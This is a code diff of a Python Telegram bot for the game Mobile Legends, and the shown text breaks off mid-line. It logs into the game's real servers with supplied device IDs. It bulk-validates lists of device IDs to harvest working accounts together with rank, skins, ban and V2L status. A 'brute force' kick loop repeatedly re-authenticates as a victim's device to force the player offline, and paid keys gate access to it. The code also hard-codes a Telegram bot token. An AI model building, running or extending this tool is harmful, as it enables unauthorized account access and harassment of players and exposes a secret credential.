@@ -13,7 +13,7 @@ import zlib
 import socket
 from enum import Enum
 from typing import Any, List, Optional, Tuple
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
 import logging
 import string
 import re
@@ -35,6 +35,7 @@ BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"
 ADMIN_IDS = [8477982865]
 KEYS_FILE = "keys.json"
 USERS_FILE = "users.json"
+BANNED_FILE = "banned_accounts.txt"
 
 LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
 LOGIN_PORT = int(os.environ.get('MLBB_LOGIN_PORT', 30021))
@@ -45,6 +46,8 @@ CONN_TO = float(os.environ.get('MLBB_CONN_TO', '3.0'))
 READ_TO = float(os.environ.get('MLBB_READ_TO', '3.5'))
 _AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
 _AES_IV = b'\x00' * 16
+
+TZ_WIB = timezone(timedelta(hours=7))
 
 HERO_ID_MAP = {
     1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
@@ -151,7 +154,143 @@ def fmt_last_login(ts_val):
         return str(ts_val)
 
 
-def extract_player_data(result) -> Optional[dict]:
+def fmt_created_at(ts_val):
+    if not ts_val:
+        return "N/A"
+    try:
+        t = int(ts_val)
+        if t <= 0:
+            return "N/A"
+        dt = datetime.fromtimestamp(t, tz=timezone.utc).astimezone(TZ_WIB)
+        return dt.strftime("%Y-%m-%d %H:%M:%S WIB")
+    except Exception:
+        return "N/A"
+
+
+def is_banned_status(ban_status) -> bool:
+    if not ban_status:
+        return False
+    return 'ban' in str(ban_status).lower()
+
+
+# ────────────────────────────────────────────────────────────────
+# V2L DETECTION
+# ────────────────────────────────────────────────────────────────
+
+async def _get_v2l_status(reader, writer, acc, zone) -> str:
+    """
+    Query V2L status using packets 10208, 10145, 10143.
+    Returns "Enabled", "Disabled", or "N/A".
+    """
+    try:
+        writer.write(_frame(10208, 4, SDP({0: int(acc), 1: int(zone)}).data))
+        await asyncio.wait_for(writer.drain(), timeout=1.0)
+        for _ in range(3):
+            try:
+                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
+                flags = int.from_bytes(hdr, 'big')
+                size = flags & 16777215
+                ct = flags >> 24
+                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
+                body = _decode(ct, body)
+                outer = SDP(body)
+                pid = outer.get(0)
+                raw = outer.get(6) or outer.get(5)
+                if pid == 10208 and raw:
+                    inner = SDP(raw)
+                    for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21):
+                        val = inner.get(tag)
+                        if val is None:
+                            continue
+                        if isinstance(val, (int, float)):
+                            return "Enabled" if int(val) > 0 else "Disabled"
+                        if isinstance(val, str):
+                            if val.lower() in ("1", "true", "enabled", "yes"):
+                                return "Enabled"
+                            if val.lower() in ("0", "false", "disabled", "no"):
+                                return "Disabled"
+                elif pid is None:
+                    break
+            except Exception:
+                break
+    except Exception:
+        pass
+
+    try:
+        writer.write(_frame(10145, 5, SDP({0: int(acc), 1: int(zone)}).data))
+        await asyncio.wait_for(writer.drain(), timeout=1.0)
+        for _ in range(3):
+            try:
+                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
+                flags = int.from_bytes(hdr, 'big')
+                size = flags & 16777215
+                ct = flags >> 24
+                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
+                body = _decode(ct, body)
+                outer = SDP(body)
+                pid = outer.get(0)
+                raw = outer.get(6) or outer.get(5)
+                if pid in (10146, 10160) and raw:
+                    inner = SDP(raw)
+                    for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5):
+                        val = inner.get(tag)
+                        if val is None:
+                            continue
+                        if isinstance(val, (int, float)):
+                            return "Enabled" if int(val) > 0 else "Disabled"
+                        if isinstance(val, str):
+                            if val.lower() in ("1", "true", "enabled", "yes"):
+                                return "Enabled"
+                            if val.lower() in ("0", "false", "disabled", "no"):
+                                return "Disabled"
+                elif pid is None:
+                    break
+            except Exception:
+                break
+    except Exception:
+        pass
+
+    try:
+        writer.write(_frame(10143, 6, SDP({0: int(acc), 1: int(zone)}).data))
+        await asyncio.wait_for(writer.drain(), timeout=1.0)
+        for _ in range(3):
+            try:
+                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
+                flags = int.from_bytes(hdr, 'big')
+                size = flags & 16777215
+                ct = flags >> 24
+                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
+                body = _decode(ct, body)
+                outer = SDP(body)
+                pid = outer.get(0)
+                raw = outer.get(6) or outer.get(5)
+                if pid == 10144 and raw:
+                    inner = SDP(raw)
+                    for tag in (118, 5, 2, 3):
+                        nested = inner.get(tag)
+                        if isinstance(nested, (dict, SDP)):
+                            for subtag in (10, 11, 13, 14, 15, 0, 2, 3, 5):
+                                val = nested.get(subtag)
+                                if val is None:
+                                    continue
+                                if isinstance(val, (int, float)):
+                                    return "Enabled" if int(val) > 0 else "Disabled"
+                                if isinstance(val, str):
+                                    if val.lower() in ("1", "true", "enabled", "yes"):
+                                        return "Enabled"
+                                    if val.lower() in ("0", "false", "disabled", "no"):
+                                        return "Disabled"
+                elif pid is None:
+                    break
+            except Exception:
+                break
+    except Exception:
+        pass
+
+    return "N/A"
+
+
+def extract_player_data(result, created_ts=None, v2l_status="N/A") -> Optional[dict]:
     if not result:
         return None
     try:
@@ -233,6 +372,11 @@ def extract_player_data(result) -> Optional[dict]:
             hero_count = int(pd.get(4, 0) or 0)
         except Exception:
             pass
+
+        # Created-at timestamp: prefer tag 42, fall back to creation_ts from login
+        created_raw = pd.get(42) or created_ts
+        created_at_str = fmt_created_at(created_raw)
+
         return {
             "nickname": nickname,
             "player_id": pd.get(0, "Unknown"),
@@ -253,6 +397,8 @@ def extract_player_data(result) -> Optional[dict]:
             "win_rate": win_rate,
             "last_hero": last_hero,
             "prev_heroes": prev_heroes,
+            "v2l_status": v2l_status,
+            "created_at": created_at_str,
         }
     except Exception as e:
         logger.error(f"extract_player_data error: {e}")
@@ -263,6 +409,7 @@ def format_result_line(res: dict) -> str:
     acc = res['acc']
     zone = res['zone']
     did = res['did']
+    ban = res.get('ban_status', 'NORMAL')
     player = res.get('player')
     if player:
         prev = ", ".join(player["prev_heroes"]) if player["prev_heroes"] else "N/A"
@@ -281,14 +428,35 @@ def format_result_line(res: dict) -> str:
             f"Squad: {player['squad']} | "
             f"Collector: {player['collector_tier']} | "
             f"Affinity: {player['affinity']} | "
+            f"V2L Status: {player.get('v2l_status', 'N/A')} | "
+            f"Created: {player.get('created_at', 'N/A')} | "
             f"Last Login: {player['last_login']} | "
             f"Country: {player['last_login_country']} | "
             f"Reg: {player['create_country']} | "
+            f"Ban: {ban} | "
             f"DevID: {did}"
         )
     else:
-        line = f"Account: {acc} | Zone: {zone} | DevID: {did}"
+        line = f"Account: {acc} | Zone: {zone} | Ban: {ban} | DevID: {did}"
     return line
+
+
+def format_banned_line(res: dict) -> str:
+    acc = res['acc']
+    zone = res['zone']
+    did = res['did']
+    ban = res.get('ban_status', 'Unknown')
+    player = res.get('player') or {}
+    return (
+        f"Account: {acc} | Zone: {zone} | "
+        f"Name: {player.get('nickname', 'N/A')} | "
+        f"Level: {player.get('level', 0)} | "
+        f"Rank: {player.get('current_rank', 'Unknown')} | "
+        f"V2L: {player.get('v2l_status', 'N/A')} | "
+        f"Created: {player.get('created_at', 'N/A')} | "
+        f"Ban: {ban} | "
+        f"DevID: {did}"
+    )
 
 
 class LiveStats:
@@ -314,8 +482,12 @@ class LiveStats:
         self.unreg = 0
         self.with_info = 0
         self.no_info = 0
+        self.banned = 0
+        self.v2l_active = 0
+        self.v2l_inactive = 0
 
     def add_hit(self, res: dict):
+        """Register a NON-banned valid account."""
         self.total_hits += 1
         player = res.get('player')
         if not player:
@@ -325,6 +497,11 @@ class LiveStats:
         level = player.get('level', 0) or 0
         skin = player.get('skin_count', 0) or 0
         rank = player.get('current_rank', '') or ''
+        v2l = str(player.get('v2l_status', '')).lower()
+        if v2l == 'enabled':
+            self.v2l_active += 1
+        elif v2l == 'disabled':
+            self.v2l_inactive += 1
         if level <= 30:
             self.lvl_1_30 += 1
         elif level <= 50:
@@ -361,6 +538,15 @@ class LiveStats:
         elif 'mythic' in rank_lower or 'mythical' in rank_lower:
             self.rank_mythic += 1
 
+    def add_banned(self, res: dict):
+        """Register a banned account."""
+        self.total_hits += 1
+        self.banned += 1
+        if res.get('player'):
+            self.with_info += 1
+        else:
+            self.no_info += 1
+
     def add_unreg(self):
         self.unreg += 1
 
@@ -380,6 +566,9 @@ class LiveStats:
             f"  Master: {self.rank_master:,} | GM: {self.rank_gm:,}\n"
             f"  Epic: {self.rank_epic:,} | Legend: {self.rank_legend:,}\n"
             f"  Mythic+: {self.rank_mythic:,}\n\n"
+            f"🔐 V2L\n"
+            f"  Enabled: {self.v2l_active:,} | Disabled: {self.v2l_inactive:,}\n\n"
+            f"🚫 Banned: {self.banned:,}\n"
             f"📦 Hits: {self.total_hits:,} | Info: {self.with_info:,}\n"
             f"🚫 No Info: {self.no_info:,} | Unreg: {self.unreg:,}"
         )
@@ -790,67 +979,47 @@ async def _get_game_server(acc, skey, zone, writer_login, reader_login) -> Optio
         return None
 
 
-async def _get_player_info(acc, skey, zone, did, gs_host, gs_port) -> Optional[SDP]:
-    writer = None
+async def _check_ban_on_conn(reader, writer) -> str:
     try:
-        r, w = await asyncio.wait_for(asyncio.open_connection(gs_host, gs_port), timeout=CONN_TO)
-        writer = w
-        auth_payload = SDP({0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: did}).data
-        w.write(_frame(10001, 1, auth_payload))
-        w.write(_frame(10101, 2, SDP({0: 0, 2: 2}).data))
-        await asyncio.wait_for(w.drain(), timeout=1.0)
-        authed = False
-        for _ in range(30):
+        writer.write(_frame(10101, 2, SDP({0: 0, 2: 2}).data))
+        await asyncio.wait_for(writer.drain(), timeout=1.0)
+        for _ in range(5):
             try:
-                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
+                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
                 flags = int.from_bytes(hdr, 'big')
                 size = flags & 16777215
                 ct = flags >> 24
-                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
+                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
                 body = _decode(ct, body)
                 outer = SDP(body)
                 pid = outer.get(0)
-                if pid == 10002:
-                    authed = True
-                    break
-                elif pid == 20001:
-                    continue
-                else:
-                    break
-            except Exception:
-                break
-        if not authed:
-            return None
-        info_payload = SDP({1: int(acc)}).data
-        w.write(_frame(11153, 3, info_payload))
-        await asyncio.wait_for(w.drain(), timeout=1.0)
-        for _ in range(10):
-            try:
-                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
-                flags = int.from_bytes(hdr, 'big')
-                size = flags & 16777215
-                ct = flags >> 24
-                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
-                body = _decode(ct, body)
-                outer = SDP(body)
-                pid = outer.get(0)
-                if pid == 11154:
+                if pid == 20001:
                     raw = outer.get(6) or outer.get(5)
                     if isinstance(raw, bytes):
-                        return SDP(raw)
-                    return None
+                        inner = SDP(raw)
+                        binfo = inner.get(0)
+                        if isinstance(binfo, (dict, SDP)):
+                            reason = binfo.get('ban_reason', 'Unknown')
+                            d = binfo.get('endtime_day', '0')
+                            h = binfo.get('endtime_hour', '0')
+                            m = binfo.get('endtime_min', '0')
+                            s = binfo.get('endtime_sec', '0')
+                            return f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
+                        for v in inner.values():
+                            if isinstance(v, str) and any(
+                                kw in v.lower() for kw in ('ban', 'suspend', 'freeze', 'limit')
+                            ):
+                                return f"BANNED ({v})"
+                        return "BANNED (Unknown reason)"
+                elif pid == 20002:
+                    return "NORMAL"
+                elif pid is None:
+                    break
             except Exception:
                 break
-        return None
     except Exception:
-        return None
-    finally:
-        if writer:
-            try:
-                writer.close()
-                await writer.wait_closed()
-            except Exception:
-                pass
+        pass
+    return "NORMAL"
 
 
 async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[dict]:
@@ -880,6 +1049,7 @@ async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[
             if not acc:
                 return None
             skey = inner.get(1, '')
+            creation_ts = inner.get(19, 0)
             zr = inner.get(2)
             if isinstance(zr, list):
                 zones = [z for z in zr if isinstance(z, int)] if zr else [0]
@@ -892,12 +1062,87 @@ async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[
             zone = zones[0] if zones else 0
             gs_info = await _get_game_server(acc, skey, zone, w, r)
             player_data = None
+            ban_status = "NORMAL"
+            v2l_status = "N/A"
+
             if gs_info:
                 gs_host, gs_port = gs_info
-                gs_result = await _get_player_info(acc, skey, zone, did, gs_host, gs_port)
-                if gs_result:
-                    player_data = extract_player_data(gs_result)
-            return {'did': did, 'acc': acc, 'zone': zone, 'player': player_data}
+                gr = None
+                gw = None
+                try:
+                    gr, gw = await asyncio.wait_for(
+                        asyncio.open_connection(gs_host, gs_port), timeout=CONN_TO
+                    )
+                    auth_payload = SDP({0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: did}).data
+                    gw.write(_frame(10001, 1, auth_payload))
+                    await asyncio.wait_for(gw.drain(), timeout=1.0)
+                    authed = False
+                    for _ in range(10):
+                        try:
+                            ghdr = await asyncio.wait_for(_read_n(gr, 4), timeout=READ_TO)
+                            gflags = int.from_bytes(ghdr, 'big')
+                            gsize = gflags & 16777215
+                            gct = gflags >> 24
+                            gbody = await asyncio.wait_for(_read_n(gr, gsize - 4), timeout=READ_TO)
+                            gbody = _decode(gct, gbody)
+                            gouter = SDP(gbody)
+                            gpid = gouter.get(0)
+                            if gpid == 10002:
+                                authed = True
+                                break
+                            elif gpid == 20001:
+                                continue
+                            else:
+                                break
+                        except Exception:
+                            break
+                    if authed:
+                        ban_status = await _check_ban_on_conn(gr, gw)
+
+                        # V2L status check
+                        v2l_status = await _get_v2l_status(gr, gw, acc, zone)
+
+                        # Fetch player info
+                        gw.write(_frame(11153, 3, SDP({1: int(acc)}).data))
+                        await asyncio.wait_for(gw.drain(), timeout=1.0)
+                        for _ in range(10):
+                            try:
+                                ghdr = await asyncio.wait_for(_read_n(gr, 4), timeout=READ_TO)
+                                gflags = int.from_bytes(ghdr, 'big')
+                                gsize = gflags & 16777215
+                                gct = gflags >> 24
+                                gbody = await asyncio.wait_for(_read_n(gr, gsize - 4), timeout=READ_TO)
+                                gbody = _decode(gct, gbody)
+                                gouter = SDP(gbody)
+                                gpid = gouter.get(0)
+                                if gpid == 11154:
+                                    graw = gouter.get(6) or gouter.get(5)
+                                    if isinstance(graw, bytes):
+                                        player_data = extract_player_data(
+                                            SDP(graw),
+                                            created_ts=creation_ts,
+                                            v2l_status=v2l_status,
+                                        )
+                                    break
+                            except Exception:
+                                break
+                except Exception:
+                    pass
+                finally:
+                    if gw:
+                        try:
+                            gw.close()
+                            await gw.wait_closed()
+                        except Exception:
+                            pass
+
+            return {
+                'did': did,
+                'acc': acc,
+                'zone': zone,
+                'ban_status': ban_status,
+                'player': player_data,
+            }
         except Exception:
             return None
         finally:
@@ -926,7 +1171,6 @@ BACKUP_GATEWAYS = [
 
 
 def _sync_recv_frame(sock: socket.socket) -> Optional[Tuple[int, bytes]]:
-    """Read one framed message from a blocking socket. Returns (pid, decoded_body) or None."""
     try:
         hdr = b''
         while len(hdr) < 4:
@@ -955,12 +1199,71 @@ def _sync_recv_frame(sock: socket.socket) -> Optional[Tuple[int, bytes]]:
         return None
 
 
+def _sync_send_frame(sock: socket.socket, pid: int, seq: int, sdp: SDP):
+    pkt = SDP({0: pid, 1: seq, 5: sdp.data}).data
+    comp = zstd.compress(pkt)
+    flags = (len(comp) + 4) | (16 << 24)
+    sock.sendall(flags.to_bytes(4, 'big') + comp)
+
+
+def _sync_get_v2l(sock: socket.socket, acc: int, zone: int) -> str:
+    try:
+        _sync_send_frame(sock, 10208, 4, SDP({0: int(acc), 1: int(zone)}))
+        for _ in range(3):
+            res = _sync_recv_frame(sock)
+            if not res:
+                break
+            pid, raw = res
+            if pid == 10208 and raw:
+                inner = SDP(raw)
+                for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21):
+                    val = inner.get(tag)
+                    if val is None:
+                        continue
+                    if isinstance(val, (int, float)):
+                        return "Enabled" if int(val) > 0 else "Disabled"
+                    if isinstance(val, str):
+                        if val.lower() in ("1", "true", "enabled", "yes"):
+                            return "Enabled"
+                        if val.lower() in ("0", "false", "disabled", "no"):
+                            return "Disabled"
+            elif pid is None:
+                break
+    except Exception:
+        pass
+
+    try:
+        _sync_send_frame(sock, 10145, 5, SDP({0: int(acc), 1: int(zone)}))
+        for _ in range(3):
+            res = _sync_recv_frame(sock)
+            if not res:
+                break
+            pid, raw = res
+            if pid in (10146, 10160) and raw:
+                inner = SDP(raw)
+                for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5):
+                    val = inner.get(tag)
+                    if val is None:
+                        continue
+                    if isinstance(val, (int, float)):
+                        return "Enabled" if int(val) > 0 else "Disabled"
+                    if isinstance(val, str):
+                        if val.lower() in ("1", "true", "enabled", "yes"):
+                            return "Enabled"
+                        if val.lower() in ("0", "false", "disabled", "no"):
+                            return "Disabled"
+            elif pid is None:
+                break
+    except Exception:
+        pass
+
+    return "N/A"
+
+
 def fetch_session_profile(device_id: str) -> Optional[dict]:
-    """Synchronous: login → get game server → get player info. Returns dict or None."""
     sock = None
     sock2 = None
     try:
-        # Step 1: Login
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
         sock.connect((LOGIN_HOST, LOGIN_PORT))
@@ -977,6 +1280,7 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
         if not acc:
             return None
         skey = inner.get(1, '')
+        creation_ts = inner.get(19, 0)
         zr = inner.get(2)
         if isinstance(zr, list):
             zones = [z for z in zr if isinstance(z, int)] if zr else [0]
@@ -988,7 +1292,6 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
             zones = [0]
         zone = zones[0] if zones else 0
 
-        # Step 2: Game server address
         payload_gs = SDP({0: acc, 1: skey, 2: CLI_VER, 5: zone, 6: CHANNEL}).data
         sock.sendall(_frame(5, 2, payload_gs))
         res = _sync_recv_frame(sock)
@@ -1004,8 +1307,9 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
         gs_host, gs_port = str(addr).split(':', 1)
         gs_port = int(gs_port)
 
-        # Step 3: Player info from game server
         player_data = {}
+        ban_status = "NORMAL"
+        v2l_status = "N/A"
         try:
             sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock2.settimeout(5)
@@ -1031,6 +1335,39 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
                     break
 
             if authed:
+                for _ in range(5):
+                    res = _sync_recv_frame(sock2)
+                    if not res:
+                        break
+                    pid, raw = res
+                    if pid == 20001 and raw:
+                        b_inner = SDP(raw)
+                        b_data = b_inner.get(0)
+                        if isinstance(b_data, (dict, SDP)):
+                            reason = b_data.get('ban_reason', 'Unknown')
+                            d = b_data.get('endtime_day', '0')
+                            h = b_data.get('endtime_hour', '0')
+                            m = b_data.get('endtime_min', '0')
+                            s = b_data.get('endtime_sec', '0')
+                            ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
+                        else:
+                            for v in b_inner.values():
+                                if isinstance(v, str) and any(
+                                    kw in v.lower() for kw in ('ban', 'suspend', 'freeze', 'limit')
+                                ):
+                                    ban_status = f"BANNED ({v})"
+                                    break
+                            else:
+                                ban_status = "BANNED (Unknown reason)"
+                        break
+                    elif pid == 20002:
+                        ban_status = "NORMAL"
+                        break
+
+                # V2L status
+                v2l_status = _sync_get_v2l(sock2, acc, zone)
+
+                # Player info
                 sock2.sendall(_frame(11153, 3, SDP({1: int(acc)}).data))
                 for _ in range(10):
                     res = _sync_recv_frame(sock2)
@@ -1040,7 +1377,11 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
                     if pid == 11154:
                         if raw:
                             result = SDP(raw)
-                            player_data = extract_player_data(result) or {}
+                            player_data = extract_player_data(
+                                result,
+                                created_ts=creation_ts,
+                                v2l_status=v2l_status,
+                            ) or {}
                         break
         except Exception:
             pass
@@ -1050,15 +1391,19 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
             'account_id': acc,
             'session_key': skey,
             'zone_id': zone,
+            'creation_ts': creation_ts,
             'game_host': gs_host,
             'game_port': gs_port,
             'gs_info': f"{gs_host}:{gs_port}",
-            'nickname': player_data.get('nickname', 'Unknown'),
-            'level': player_data.get('level', 0),
-            'rank': player_data.get('current_rank', 'Unknown'),
-            'highest_rank': player_data.get('high_rank', 'Unknown'),
-            'skin_count': player_data.get('skin_count', 0),
-            'hero_count': player_data.get('hero_count', 0),
+            'ban_status': ban_status,
+            'v2l_status': v2l_status,
+            'created_at': fmt_created_at(player_data.get('created_at_ts') if isinstance(player_data, dict) else creation_ts) if False else (player_data.get('created_at', 'N/A') if isinstance(player_data, dict) else fmt_created_at(creation_ts)),
+            'nickname': player_data.get('nickname', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
+            'level': player_data.get('level', 0) if isinstance(player_data, dict) else 0,
+            'rank': player_data.get('current_rank', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
+            'highest_rank': player_data.get('high_rank', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
+            'skin_count': player_data.get('skin_count', 0) if isinstance(player_data, dict) else 0,
+            'hero_count': player_data.get('hero_count', 0) if isinstance(player_data, dict) else 0,
         }
     except Exception as e:
         logger.error(f"fetch_session_profile error: {e}")
@@ -1073,11 +1418,6 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
 
 
 def send_session_kick(profile: dict, timeout: float = 4.5) -> Tuple[bool, float, str]:
-    """Synchronous single kick attempt. Returns (success, latency_ms, status).
-
-    Sends BOTH the 10001 auth packet AND the 10101 follow-up packet.
-    The ACK read is optional (short timeout, non-fatal).
-    """
     t0 = time.time()
     sock = None
     try:
@@ -1094,13 +1434,11 @@ def send_session_kick(profile: dict, timeout: float = 4.5) -> Tuple[bool, float,
             15: profile['device_id']
         }).data
 
-        # Send auth packet (10001)
         pkt = SDP({0: 10001, 1: 1, 5: body_struct}).data
         comp = zstd.compress(pkt)
         flags = (len(comp) + 4) | (16 << 24)
         sock.sendall(flags.to_bytes(4, 'big') + comp)
 
-        # Send follow-up packet (10101)
         pkt2 = SDP({0: 10101, 1: 2, 5: SDP({0: 0, 2: 2}).data}).data
         comp2 = zstd.compress(pkt2)
         flags2 = (len(comp2) + 4) | (16 << 24)
@@ -1158,7 +1496,6 @@ def send_session_kick(profile: dict, timeout: float = 4.5) -> Tuple[bool, float,
 
 async def run_kick_loop(profile: dict, total_loops: int, delay_sec: float,
                         progress_cb=None, cancel_check=None) -> dict:
-    """Async wrapper for running kick loops with live progress updates."""
     loop = asyncio.get_event_loop()
     count = 0
     success_count = 0
@@ -1190,7 +1527,6 @@ async def run_kick_loop(profile: dict, total_loops: int, delay_sec: float,
         if total_loops > 0 and count >= total_loops:
             break
 
-        # Enforce a minimum delay in unlimited mode to avoid hammering
         if delay_sec > 0:
             await asyncio.sleep(delay_sec)
         elif total_loops == 0:
@@ -1211,6 +1547,7 @@ async def run_kick_loop(profile: dict, total_loops: int, delay_sec: float,
         'speed': speed
     }
 
+
 # ────────────────────────────────────────────────────────────────
 # END BRUTE FORCE MODULE
 # ────────────────────────────────────────────────────────────────
@@ -1222,10 +1559,8 @@ class MLBBBot:
         self.live_stats = {}
         self.bf_profiles = {}
         self.bf_cancel_flags = {}
-        # NEW: live status + task handle per user, and a lock to make
-        # the "only one kicker per user" check race-free.
-        self.bf_running = {}       # user_id -> dict(status fields)
-        self.bf_tasks = {}         # user_id -> asyncio.Task
+        self.bf_running = {}
+        self.bf_tasks = {}
         self.bf_running_lock = asyncio.Lock()
 
     def _is_admin(self, user_id: int) -> bool:
@@ -1235,12 +1570,10 @@ class MLBBBot:
         return key_manager.has_access(user_id)
 
     def _bf_is_active(self, user_id: int) -> bool:
-        """Return True if this user already has a live kicker task."""
         task = self.bf_tasks.get(user_id)
         if task is None:
             return False
         if task.done():
-            # Clean up stale entry
             self.bf_tasks.pop(user_id, None)
             self.bf_running.pop(user_id, None)
             return False
@@ -1511,13 +1844,11 @@ class MLBBBot:
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
 
     async def bf_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /bf <device_id> to start bruteforce flow."""
         user_id = update.effective_user.id
         if not self._check_access(user_id):
             await update.message.reply_text("❌ No access. Use /redeem <KEY>")
             return
 
-        # NEW: refuse if this user already has a running kicker
         if self._bf_is_active(user_id):
             await update.message.reply_text(
                 "⚠️ You already have a kicker running!\n"
@@ -1563,6 +1894,11 @@ class MLBBBot:
 
         self.bf_profiles[user_id] = profile
 
+        if is_banned_status(profile.get('ban_status')):
+            ban_line = f"🚫 Status      : {profile['ban_status']}\n"
+        else:
+            ban_line = f"✅ Status      : NORMAL\n"
+
         profile_text = (
             f"📋 Account Profile\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -1574,6 +1910,9 @@ class MLBBBot:
             f"🌟 Highest     : {profile['highest_rank']}\n"
             f"🎨 Skins       : {profile['skin_count']}\n"
             f"🦸 Heroes      : {profile['hero_count']}\n"
+            f"🔐 V2L Status  : {profile.get('v2l_status', 'N/A')}\n"
+            f"📅 Created     : {profile.get('created_at', 'N/A')}\n"
+            f"{ban_line}"
         )
 
         keyboard = [
@@ -1597,7 +1936,6 @@ class MLBBBot:
 
     async def bf_start_kick(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
                             total_loops: int, delay_sec: float):
-        """Start the kick loop in the BACKGROUND. Enforces one-kicker-per-user."""
         query = update.callback_query
         user_id = query.from_user.id
         await query.answer()
@@ -1610,7 +1948,6 @@ class MLBBBot:
                 pass
             return
 
-        # NEW: atomic "only one kicker per user" check
         async with self.bf_running_lock:
             if self._bf_is_active(user_id):
                 try:
@@ -1652,7 +1989,6 @@ class MLBBBot:
             last_edit = [0.0]
 
             async def progress_cb(count, success_count, fail_count, lat):
-                # Update in-memory state for /bfstatus
                 st = self.bf_running.get(user_id)
                 if st is not None:
                     st['count'] = count
@@ -1700,7 +2036,6 @@ class MLBBBot:
                     await context.bot.send_message(chat_id, f"❌ Kicker error: {e}")
                 except Exception:
                     pass
-                # cleanup
                 self.bf_cancel_flags.pop(user_id, None)
                 self.bf_running.pop(user_id, None)
                 self.bf_tasks.pop(user_id, None)
@@ -1734,20 +2069,15 @@ class MLBBBot:
             except Exception:
                 pass
 
-            # cleanup on normal finish
             self.bf_cancel_flags.pop(user_id, None)
             self.bf_running.pop(user_id, None)
             self.bf_tasks.pop(user_id, None)
 
-        # Run in background so callback handler returns immediately
         task = asyncio.create_task(_runner())
         self.bf_tasks[user_id] = task
 
     async def bfstatus_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """NEW: /bfstatus — Show current brute force status for this user."""
         user_id = update.effective_user.id
-
-        # Clean up stale task entries first
         self._bf_is_active(user_id)
 
         st = self.bf_running.get(user_id)
@@ -1800,7 +2130,6 @@ class MLBBBot:
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
 
-        # Handle custom bruteforce input
         if context.user_data.get('bf_custom') and update.message.text:
             context.user_data['bf_custom'] = False
             try:
@@ -1816,7 +2145,6 @@ class MLBBBot:
                     await update.message.reply_text("❌ Session expired. Use /bf <device_id> again.")
                     return
 
-                # NEW: atomic one-kicker-per-user check
                 async with self.bf_running_lock:
                     if self._bf_is_active(user_id):
                         await update.message.reply_text(
@@ -1984,24 +2312,33 @@ class MLBBBot:
             checked = 0
             valid = 0
             failed = 0
+            banned = 0
             results = []
+            banned_results = []
             start_time = time.monotonic()
             last_update = 0
 
             async def worker(did):
-                nonlocal checked, valid, failed
+                nonlocal checked, valid, failed, banned
                 if self.active_tasks[user_id]['cancelled']:
                     return
                 res = await _check(did, sem, bucket)
                 async with lock:
                     checked += 1
-                    if res:
-                        valid += 1
-                        results.append(res)
-                        stats.add_hit(res)
-                    else:
+                    if not res:
                         failed += 1
                         stats.add_unreg()
+                        return
+
+                    if is_banned_status(res.get('ban_status')):
+                        banned += 1
+                        banned_results.append(res)
+                        stats.add_banned(res)
+                        return
+
+                    valid += 1
+                    results.append(res)
+                    stats.add_hit(res)
 
             tasks = [asyncio.create_task(worker(did)) for did in ids]
             while not all(t.done() for t in tasks) and not self.active_tasks[user_id]['cancelled']:
@@ -2019,7 +2356,8 @@ class MLBBBot:
                     progress_text = (
                         f"⚡ [{bar}] {progress:.1f}%\n\n"
                         f"✅ {checked:,}/{limit:,} | 🟢 {valid:,}\n"
-                        f"❌ {failed:,} | ⚡ {speed:.1f}/s\n"
+                        f"❌ {failed:,} | 🚫 {banned:,}\n"
+                        f"⚡ {speed:.1f}/s\n"
                         f"⏱ {int(elapsed // 60)}m {int(elapsed % 60)}s | ⏳ {eta_m}m {eta_s}s\n"
                     )
                     stats_text = stats.format()
@@ -2048,7 +2386,7 @@ class MLBBBot:
             elapsed = time.monotonic() - start_time
 
             if results:
-                output_file = f"{valid}DevId_Valid.txt"
